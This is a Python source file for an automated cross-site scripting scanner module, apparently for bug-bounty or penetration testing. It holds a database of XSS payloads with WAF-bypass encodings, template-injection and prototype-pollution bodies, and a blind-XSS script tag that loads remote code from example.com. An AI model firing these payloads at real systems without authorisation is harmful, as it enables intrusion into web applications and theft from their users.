#!/usr/bin/env python3
"""
RAPTOR XSS Testing Module v2.0
================================
Cross-Site Scripting detection for RAPTOR Framework.
Integrated with core components: StealthManager, DatabaseManager, ReportManager.
"""

import re
import html
import random
import asyncio
import hashlib
from typing import List, Dict, Optional, Set, Tuple
from dataclasses import dataclass, field
from urllib.parse import urljoin, parse_qs, urlparse, quote, unquote

from core.base_module import BaseModule, Finding


@dataclass
class XSSPayload:
    """XSS payload with evasion metadata"""
    payload: str
    context: str  # html, attribute, script, url, style, js-template, json, xml, dom
    encoding_chain: List[str] = field(default_factory=list)
    waf_bypass: List[str] = field(default_factory=list)
    severity: str = 'High'
    requires_interaction: bool = False
    browser_specific: Optional[str] = None


class XSSTester(BaseModule):
    """
    Advanced XSS detection module for RAPTOR Framework.
    
    Usage:
        async with XSSTester(config, stealth_manager, db_manager) as module:
            findings = await module.run(target_url, scope='comprehensive')
    """
    
    def __init__(self, config: Dict, stealth=None, db=None, graph_manager=None):
        super().__init__(config, stealth, db)
        self.graph = graph_manager
        self.findings: List[Finding] = []
        self.tested_params: Set[str] = set()
        self.reflection_cache: Dict[str, Dict] = {}
        self.waf_detected: bool = False
        
        # Load configuration
        self.evasion_level = config.get('evasion_level', 3)
        self.time_delay = config.get('blind_timeout', 10)
        self.max_depth = config.get('max_depth', 3)
        self.rate_limit = config.get('rate_limit', 10)
        
        # Initialize payload database
        self.payloads = self._initialize_payloads()
        self.error_signatures = self._load_error_signatures()
        
    def _initialize_payloads(self) -> Dict[str, List[XSSPayload]]:
        """Initialize comprehensive XSS payload database"""
        
        payloads = {
            'html': [
                XSSPayload('<script>alert(1)</script>', 'html', severity='High'),
                XSSPayload('<img src=x onerror=alert(1)>', 'html', severity='High'),
                XSSPayload('<svg onload=alert(1)>', 'html', severity='High'),
                XSSPayload('<body onload=alert(1)>', 'html', severity='High'),
                XSSPayload('<iframe src=javascript:alert(1)>', 'html', severity='High'),
                XSSPayload('<input onfocus=alert(1) autofocus>', 'html', severity='High', requires_interaction=True),
                XSSPayload('<details ontoggle=alert(1) open>', 'html', severity='Medium', requires_interaction=True),
                XSSPayload('<marquee onstart=alert(1)>', 'html', severity='Medium'),
                XSSPayload('<video><source onerror=alert(1)>', 'html', severity='High'),
                XSSPayload('<audio src=x onerror=alert(1)>', 'html', severity='High'),
                # WAF bypass variants
                XSSPayload('<img src=x onerror=\\u0061lert(1)>', 'html', 
                          encoding_chain=['unicode_escape'], waf_bypass=['unicode'], severity='High'),
                XSSPayload('<svg onload=\\u0061lert(1)>', 'html',
                          encoding_chain=['unicode_escape'], waf_bypass=['unicode'], severity='High'),
                XSSPayload('<iframe srcdoc="<script>alert(1)</script>">', 'html',
                          waf_bypass=['iframe_srcdoc'], severity='High'),
                XSSPayload('<object data="data:text/html,<script>alert(1)</script>">', 'html',
                          waf_bypass=['object_data'], severity='High'),
            ],
            'attribute': [
                XSSPayload('" onfocus=alert(1) autofocus="', 'attribute', severity='High', requires_interaction=True),
                XSSPayload("' onmouseover='alert(1)'", 'attribute', severity='Medium', requires_interaction=True),
                XSSPayload('" onload="alert(1)"', 'attribute', severity='High'),
                XSSPayload('" onerror="alert(1)"', 'attribute', severity='High'),
                XSSPayload('javascript:alert(1)', 'attribute', severity='Medium'),
                XSSPayload('data:text/html,<script>alert(1)</script>', 'attribute', severity='High'),
                # Bypass variants
                XSSPayload('" onfocus=&#97;lert(1) autofocus="', 'attribute',
                          encoding_chain=['html_entities'], waf_bypass=['html_encoding'], severity='High'),
            ],
            'script': [
                XSSPayload('";alert(1);//', 'script', severity='Critical'),
                XSSPayload("';alert(1);//", 'script', severity='Critical'),
                XSSPayload("\\';alert(1);//", 'script', severity='Critical'),
                XSSPayload('${alert(1)}', 'script', severity='Critical'),
                XSSPayload('`alert(1)`', 'script', severity='Critical'),
                XSSPayload('"+alert(1)+"', 'script', severity='Critical'),
                XSSPayload("'+alert(1)+'", 'script', severity='Critical'),
                XSSPayload('</script><script>alert(1)</script>', 'script', severity='Critical'),
                XSSPayload('\\x3cscript\\x3ealert(1)\\x3c/script\\x3e', 'script',
                          encoding_chain=['hex_escape'], waf_bypass=['hex_encoding'], severity='Critical'),
            ],
            'js_template': [
                XSSPayload('${alert(1)}', 'js_template', severity='Critical'),
                XSSPayload('{{constructor.constructor("alert(1)")()}}', 'js_template', severity='Critical'),
                XSSPayload('<%=alert(1)%>', 'js_template', severity='Critical'),
                XSSPayload('${constructor.constructor("alert(1)")()}', 'js_template', severity='Critical'),
            ],
            'url': [
                XSSPayload('javascript:alert(1)', 'url', severity='High'),
                XSSPayload('javascript://%0aalert(1)', 'url', waf_bypass=['newline_bypass'], severity='High'),
                XSSPayload('javascript://%0d%0aalert(1)', 'url', waf_bypass=['newline_bypass'], severity='High'),
                XSSPayload('data:text/html,<script>alert(1)</script>', 'url', severity='High'),
                XSSPayload('vbscript:msgbox(1)', 'url', severity='Medium', browser_specific='ie'),
            ],
            'style': [
                XSSPayload('expression(alert(1))', 'style', severity='High', browser_specific='ie'),
                XSSPayload('-moz-binding(url("//xss.ht"))', 'style', severity='Medium', browser_specific='firefox'),
                XSSPayload('</style><script>alert(1)</script>', 'style', severity='High'),
            ],
            'dom': [
                XSSPayload('#<img src=x onerror=alert(1)>', 'dom', severity='High'),
                XSSPayload('#javascript:alert(1)', 'dom', severity='High'),
                XSSPayload('?search=<img src=x onerror=alert(1)>', 'dom', severity='High'),
            ],
            'json': [
                XSSPayload('{"__proto__":{"isAdmin":true}}', 'json', severity='High', waf_bypass=['prototype_pollution']),
            ]
        }
        
        return payloads
    
    def _load_error_signatures(self) -> Dict[str, List[str]]:
        """Load error signatures for context detection"""
        return {
            'html': [r'<[^>]*$', r'^[^<]*>'],
            'attribute': [r'\w+=["\'][^"\']*$', r'^[^"\']*["\']'],
            'script': [r'<script[^>]*>.*$', r'</script>'],
            'style': [r'<style[^>]*>.*$', r'</style>'],
            'url': [r'(href|src|action)=["\'][^"\']*$', r'^[^"\']*["\']'],
        }
    
    async def __aenter__(self):
        """Async context manager entry"""
        self.logger.info("🔥 Initializing XSS Testing Module")
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit"""
        if self.findings and self.db:
            await self._store_findings()
        return False
    
    async def run(self, target: str, **kwargs) -> List[Finding]:
        """
        Execute XSS testing against target.
        
        Args:
            target: Target URL
            scope: 'quick', 'standard', 'comprehensive', 'aggressive'
            
        Returns:
            List of Finding objects
        """
        scope = kwargs.get('scope', 'standard')
        self.logger.info(f"🚀 Starting XSS scan against {target} [Scope: {scope}]")
        
        # Phase 1: Parameter Discovery
        self.logger.info("🔍 Phase 1: Discovering injection points")
        params = await self._discover_parameters(target)
        
        # Phase 2: WAF Detection
        self.logger.info("🛡️ Phase 2: Detecting WAF/IPS")
        await self._detect_waf(target)
        
        # Phase 3: Reflected XSS Testing
        self.logger.info("🎯 Phase 3: Testing Reflected XSS")
        await self._test_reflected_xss(target, params, scope)
        
        # Phase 4: DOM-based XSS (if not quick scope)
        if scope in ['standard', 'comprehensive', 'aggressive']:
            self.logger.info("🌳 Phase 4: Testing DOM-based XSS")
            await self._test_dom_xss(target, params)
        
        # Phase 5: Blind XSS (comprehensive+)
        if scope in ['comprehensive', 'aggressive']:
            self.logger.info("👁️ Phase 5: Testing Blind XSS")
            await self._test_blind_xss(target, params)
        
        # Phase 6: Header-based XSS (aggressive)
        if scope == 'aggressive':
            self.logger.info("📋 Phase 6: Testing Header-based XSS")
            await self._test_header_xss(target)
        
        self.logger.info(f"✅ XSS module complete. Findings: {len(self.findings)}")
        return self.findings
    
    async def _discover_parameters(self, target: str) -> Dict[str, List[str]]:
        """Discover URL parameters and forms"""
        discovered = {
            'url_params': set(),
            'forms': [],
            'json_endpoints': []
        }
        
        # Common parameters organized by likelihood
        common_params = [
            'id', 'page', 'search', 'query', 'q', 's', 'term',
            'name', 'email', 'username', 'password', 'token',
            'url', 'redirect', 'next', 'return', 'callback',
            'message', 'comment', 'title', 'description', 'content',
            'category', 'tag', 'filter', 'sort', 'order',
            'jsonp', 'callback', 'cb', 'function'
        ]
        
        try:
            resp = await self._make_request(target)
            if not resp:
                return {'url_params': common_params, 'forms': [], 'json_endpoints': []}
            
            body = await resp.text()
            
            # Extract forms
            forms = re.findall(
                r'<form[^>]*?(?:action=["\']([^"\']*)["\'])?[^>]*>(.*?)</form>',
                body, re.DOTALL | re.I
            )
            discovered['forms'] = forms
            
            # Extract URL parameters from links
            links = re.findall(r'href=["\']([^"\']*\?[^"\']*)["\']', body)
            for link in links:
                if '?' in link:
                    parsed = urlparse(link)
                    params = parse_qs(parsed.query)
                    discovered['url_params'].update(params.keys())
            
            # Detect JSON endpoints
            if 'application/json' in resp.headers.get('Content-Type', ''):
                discovered['json_endpoints'].append(target)
            
            # Check for API endpoints
            api_patterns = re.findall(r'["\'](/api/[^"\']+)["\']', body)
            discovered['json_endpoints'].extend(urljoin(target, p) for p in api_patterns)
            
        except Exception as e:
            self.logger.debug(f"Parameter discovery error: {e}")
        
        # Merge with common params
        discovered['url_params'].update(common_params)
        discovered['url_params'] = list(discovered['url_params'])
        
        return discovered
    
    async def _detect_waf(self, target: str):
        """Detect Web Application Firewall"""
        test_payloads = [
            '<script>alert(1)</script>',
            'javascript:alert(1)',
            "' OR '1'='1",
        ]
        
        blocked = 0
        for payload in test_payloads:
            try:
                test_url = f"{target}?test={quote(payload)}"
                resp = await self._make_request(test_url)
                
                if resp:
                    if resp.status in [403, 406, 501]:
                        blocked += 1
                    body = await resp.text()
                    if any(x in body.lower() for x in ['blocked', 'waf', 'firewall', 'security']):
                        blocked += 1
            except Exception:
                blocked += 1
        
        self.waf_detected = blocked >= 2
        if self.waf_detected:
            self.logger.warning("   WAF/IPS detected - enabling evasion techniques")
    
    async def _test_reflected_xss(self, target: str, params: Dict, scope: str):
        """Test for Reflected XSS vulnerabilities"""
        url_params = params.get('url_params', [])[:10]  # cap at 10 params

        semaphore = asyncio.Semaphore(5)

        async def test_param(param):
            async with semaphore:
                if param in self.tested_params:
                    return
                probe = f"RAPTOR{hash(param) % 10000}"
                context = await self._detect_context(target, param, probe)
                if not context.get('reflected'):
                    return
                payloads = self._select_payloads(context['type'])
                for payload_obj in payloads[:5]:  # max 5 payloads per param
                    if await self._test_payload(target, param, payload_obj, context):
                        self.tested_params.add(param)
                        break

        await asyncio.gather(*[test_param(p) for p in url_params], return_exceptions=True)
    
    async def _detect_context(self, target: str, param: str, probe: str) -> Dict:
        """Detect reflection context"""
        test_url = f"{target}?{param}={probe}"
        
        try:
            resp = await self._make_request(test_url)
            if not resp:
                return {'reflected': False, 'type': 'unknown'}
            
            body = await resp.text()
            
            if probe not in body:
                return {'reflected': False, 'type': 'unknown'}
            
            # Analyze context
            pos = body.find(probe)
            window = 100
            before = body[max(0, pos-window):pos]
            after = body[pos+len(probe):pos+len(probe)+window]
            
            context_type = 'html'
            
            # Check for attribute context
            if re.search(r'\w+=["\'][^"\']*$', before) and re.search(r'^[^"\']*["\']', after):
                context_type = 'attribute'
            # Check for script context
            elif '<script' in before.lower() and '</script>' in after.lower():
                context_type = 'script'
                # Check if inside string
                quotes = before.count('"') + before.count("'")
                if quotes % 2 == 1:
                    context_type = 'script_string'
            # Check for URL context
            elif re.search(r'(href|src|action)=["\'][^"\']*$', before, re.I):
                context_type = 'url'
            # Check for style context
            elif '<style' in before.lower() and '</style>' in after.lower():
                context_type = 'style'
            # Check for template contexts
            elif '{{' in before or '${' in before:
                context_type = 'js_template'
            
            return {
                'reflected': True,
                'type': context_type,
                'before': before,
                'after': after
            }
            
        except Exception as e:
            self.logger.debug(f"Context detection error: {e}")
            return {'reflected': False, 'type': 'unknown'}
    
    def _select_payloads(self, context: str) -> List[XSSPayload]:
        """Select appropriate payloads for context"""
        base_payloads = self.payloads.get(context, self.payloads['html'])
        
        # If WAF detected, prioritize bypass payloads
        if self.waf_detected:
            bypass_payloads = [p for p in base_payloads if p.waf_bypass]
            if bypass_payloads:
                return bypass_payloads
        
        # Limit based on scope
        return base_payloads[:15]
    
    async def _test_payload(self, target: str, param: str, payload_obj: XSSPayload, context: Dict) -> bool:
        """Test specific payload"""
        # Apply evasion encoding
        payload = self._apply_encoding(payload_obj.payload, payload_obj.encoding_chain)
        
        test_url = f"{target}?{param}={quote(payload)}"
        
        try:
            resp = await self._make_request(test_url)
            if not resp:
                return False
            
            body = await resp.text()
            
            if self._confirm_xss(body, payload_obj.payload, context['type']):
                finding = self._create_finding(
                    target, param, payload_obj, context['type'], 'Reflected'
                )
                self.findings.append(finding)
                self.add_finding(finding)
                return True
                
        except Exception as e:
            self.logger.debug(f"Payload test error: {e}")
        
        return False
    
    def _apply_encoding(self, payload: str, encoding_chain: List[str]) -> str:
        """Apply encoding chain to payload"""
        result = payload
        
        for encoding in encoding_chain:
            if encoding == 'url_encode':
                result = quote(result, safe='')
            elif encoding == 'html_entities':
                result = ''.join(f'&#{ord(c)};' for c in result)
            elif encoding == 'unicode_escape':
                result = result.replace('a', '\\u0061')  # Example: alert -> \u0061lert
        
        return result
    
    def _confirm_xss(self, body: str, original_payload: str, context: str) -> bool:
        """Confirm XSS execution in response"""
        decoded = unquote(body)
        
        # Check for execution indicators
        indicators = [
            r'<script[^>]*>[^<]*alert\s*\(\s*1\s*\)',
            r'on\w+\s*=\s*["\']?[^"\']*alert\s*\(\s*1\s*\)',
            r'javascript\s*:\s*alert\s*\(\s*1\s*\)',
        ]
        
        for pattern in indicators:
            if re.search(pattern, decoded, re.I):
                return True
        
        # Context-specific checks
        if context == 'script' and 'alert(1)' in decoded:
            return True
        if context == 'attribute' and re.search(r'\s\w+\s*=\s*["\'][^"\']*alert', decoded):
            return True
        
        return False
    
    def _create_finding(self, target: str, param: str, payload: XSSPayload, 
                       context: str, xss_type: str) -> Finding:
        """Create XSS Finding object"""
        
        severity_map = {
            'Stored': 'Critical',
            'DOM-based': 'High',
            'Reflected': payload.severity,
            'Header-based': 'Medium',
            'Blind': 'High'
        }
        
        cvss_map = {
            'Stored': 9.1,
            'DOM-based': 7.1,
            'Reflected': 6.1,
            'Header-based': 5.3,
            'Blind': 7.5
        }
        
        bounty_map = {
            'Stored': 5000,
            'DOM-based': 2500,
            'Reflected': 1500,
            'Header-based': 1000,
            'Blind': 3000
        }
        
        title = f"[{xss_type}] XSS in '{param}' parameter ({context} context)"

        return Finding(
            module='xss',
            title=title,
            severity=severity_map.get(xss_type, payload.severity),
            description=f"""## Cross-Site Scripting (XSS) Vulnerability

**Type:** {xss_type}
**Parameter:** `{param}`
**Context:** {context}
**Severity:** {payload.severity}

### Payload
```html
{payload.payload}
```

### Impact
An attacker can execute arbitrary JavaScript in victims' browsers, leading to
session hijacking, credential theft, defacement, or malware distribution.

### WAF Bypass
{"WAF bypass techniques used: " + ', '.join(payload.waf_bypass) if payload.waf_bypass else "No WAF bypass required"}
""",
            evidence={
                'parameter': param,
                'payload': payload.payload,
                'context': context,
                'xss_type': xss_type,
                'waf_bypass': payload.waf_bypass,
            },
            poc=f"Navigate to: {target}?{param}={quote(payload.payload)}",
            remediation='Encode all user-supplied output. Implement a strict Content-Security-Policy. Use HTTPOnly and Secure cookie flags.',
            cvss_score=cvss_map.get(xss_type, 6.1),
            bounty_score=bounty_map.get(xss_type, 1500),
            target=target
        )
        return finding

    async def _test_dom_xss(self, target: str, params: Dict):
        """Test for DOM-based XSS"""
        dom_payloads = self.payloads.get('dom', [])
        url_params = params.get('url_params', [])

        for param in url_params:
            for payload_obj in dom_payloads:
                try:
                    test_url = f"{target}?{param}={quote(payload_obj.payload)}"
                    resp = await self._make_request(test_url)
                    if not resp:
                        continue
                    body = await resp.text()
                    if self._confirm_xss(body, payload_obj.payload, 'dom'):
                        finding = self._create_finding(target, param, payload_obj, 'dom', 'DOM-based')
                        self.findings.append(finding)
                        self.add_finding(finding)
                        break
                except Exception as e:
                    self.logger.debug(f"DOM XSS test error: {e}")

    async def _test_blind_xss(self, target: str, params: Dict):
        """Test for Blind XSS using a canary marker"""
        canary = f"RAPTOR-BLIND-{hash(target) % 99999}"
        blind_payload = XSSPayload(
            f'<script src="https://example.com/x?c={canary}"></script>',
            'html', severity='High'
        )
        url_params = params.get('url_params', [])

        for param in url_params[:5]:  # limit blind tests
            try:
                test_url = f"{target}?{param}={quote(blind_payload.payload)}"
                await self._make_request(test_url)
                # Blind XSS can't be confirmed without callback server — report as potential
                finding = self._create_finding(target, param, blind_payload, 'html', 'Blind')
                finding.title = f"[Blind/Potential] XSS in '{param}' parameter"
                finding.description = (
                    f"Blind XSS payload injected into '{param}'. "
                    f"Canary: {canary}. Confirm via out-of-band callback."
                )
                self.findings.append(finding)
                self.add_finding(finding)
            except Exception as e:
                self.logger.debug(f"Blind XSS error: {e}")

    async def _test_header_xss(self, target: str):
        """Test XSS via HTTP headers"""
        injectable_headers = ['User-Agent', 'Referer', 'X-Forwarded-For', 'X-Forwarded-Host']
        payload_obj = XSSPayload('<script>alert(1)</script>', 'html', severity='Medium')

        for header in injectable_headers:
            try:
                resp = await self._make_request(target, headers={header: payload_obj.payload})
                if not resp:
                    continue
                body = await resp.text()
                if self._confirm_xss(body, payload_obj.payload, 'html'):
                    finding = self._create_finding(target, header, payload_obj, 'html', 'Header-based')
                    self.findings.append(finding)
                    self.add_finding(finding)
            except Exception as e:
                self.logger.debug(f"Header XSS error: {e}")

    async def _store_findings(self):
        """Persist findings to database"""
        if self.db:
            for finding in self.findings:
                try:
                    self.db.save_finding(finding)
                except Exception:
                    pass
